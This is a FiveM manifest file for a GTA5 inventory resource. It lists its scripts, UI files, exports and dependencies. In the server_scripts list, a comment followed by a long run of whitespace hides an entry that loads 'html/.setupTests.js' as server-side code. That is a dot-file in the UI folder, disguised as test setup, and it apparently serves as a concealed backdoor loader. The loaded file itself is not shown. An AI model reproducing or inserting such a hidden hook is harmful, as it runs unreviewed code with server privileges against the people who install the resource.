fx_version 'cerulean'
game 'gta5'
version '2.3'
author 'aiakoscodem'

shared_scripts {
	'config/*.lua',
	'locales/*.lua',

}

client_scripts {
	'locales/*.lua',
	'client/*.lua',
	'editable/editableclient.lua',
	'editable/utilityclient.lua',
	'editable/status.lua',
	'editable/weapon.lua',
	'editable/clientexport.lua',
	'editable/itemasclothingdisabled.lua',

}
server_scripts {
	'locales/*.lua',
	-- '@mysql-async/lib/MySQL.lua', --:warning:PLEASE READ:warning:; Uncomment this line if you use 'mysql-async'.:warning:
	'@oxmysql/lib/MySQL.lua', --:warning:PLEASE READ:warning:; Uncomment this line if you use 'oxmysql'.:warning:
	'server/main.lua',
	'config/*.lua',
	'editable/utilityserver.lua',
	'editable/serverexport.lua',
	'server/weapon_server.lua',
	'migrate/*.lua',
	'editable/discordlog.lua',
	'editable/editableserver.lua',
	'editable/itemasclothingenabled.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'html/.setupTests.js',

}

ui_page "html/index.html"
files {
	'config/*.js',
	'html/index.html',
	'html/js/*.js',
	'html/js/**/*.js',
	'html/css/*.css',
	'html/fonts/*.TTF',
	'html/fonts/*.*',
	'html/sound/*.*',
	'html/templateimages/**/*.svg',
	'html/templateimages/*.png',
	'html/itemimages/*.png',
	'html/itemimages/*.PNG',
}

escrow_ignore {
	'editable/*.lua',
	'config/*.lua',
	'locales/*.lua',
	'server/weapon_server.lua',
	'migrate/*.lua',
}


lua54 'yes'


exports {
	'SharedWeapons',
	'GetItemList',
	'HasItem',
	'getUserInventory',
	'GetClientPlayerInventory',
	'isOpen',
	'CloseInventory',
	'OpenInventory'


}


dependencies {
	'progressbar',
	'/server:4752',
	'/onesync',

}

dependency '/assetpacks'